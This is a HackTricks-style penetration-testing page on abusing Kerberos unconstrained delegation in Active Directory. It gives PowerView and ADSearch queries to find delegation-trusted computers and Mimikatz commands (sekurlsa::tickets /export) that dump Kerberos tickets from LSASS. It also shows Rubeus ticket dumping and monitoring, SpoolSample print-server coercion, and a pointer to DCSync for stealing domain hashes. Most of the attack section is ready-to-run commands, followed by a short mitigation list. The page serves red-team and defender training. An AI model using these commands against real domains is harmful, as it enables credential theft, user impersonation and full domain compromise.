# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

This a feature that a Domain Administrator can set to any **Computer** inside the domain. Then, anytime a **user logins** onto the Computer, a **copy of the TGT** of that user is going to be **sent inside the TGS** provided by the DC **and saved in memory in LSASS**. So, if you have Administrator privileges on the machine, you will be able to **dump the tickets and impersonate the users** on any machine.

So if a domain admin logins inside a Computer with "Unconstrained Delegation" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc).

You can **find Computer objects with this attribute** checking if the [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute contains [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does:


```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```

Load the ticket of Administrator (or victim user) in memory with **Mimikatz** or **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
More info: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**More information about Unconstrained delegation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Force Authentication**

If an attacker is able to **compromise a computer allowed for "Unconstrained Delegation"**, he could **trick** a **Print server** to **automatically login** against it **saving a TGT** in the memory of the server.\
Then, the attacker could perform a **Pass the Ticket attack to impersonate** the user Print server computer account.

To make a print server login against any machine you can use [**SpoolSample**](https://github.com/leechristensen/SpoolSample):

```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```

If the TGT if from a domain controller, you could perform a [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) and obtain all the hashes from the DC.\
[**More info about this attack in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

Find here other ways to **force an authentication:**

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Mitigation

- Limit DA/Admin logins to specific services
- Set "Account is sensitive and cannot be delegated" for privileged accounts.

{{#include ../../banners/hacktricks-training.md}}



